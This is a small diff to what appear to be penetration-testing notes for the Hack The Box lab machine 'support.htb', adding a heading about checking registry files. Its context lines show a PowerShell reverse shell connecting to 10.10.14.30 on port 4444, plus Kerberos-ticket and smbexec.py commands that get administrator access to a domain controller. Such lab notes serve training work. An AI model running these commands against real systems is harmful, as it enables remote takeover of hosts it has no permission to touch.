@@ -62,3 +62,6 @@ $client = New-Object System.Net.Sockets.TCPClient("10.10.14.30",4444);$stream = 
         export KRB5CCNAME=administrator.ccache
         smbexec.py support.htb/administrator@dc.support.htb -no-pass -k
         ```
+
+### Check for reg file
+- #### reglookup
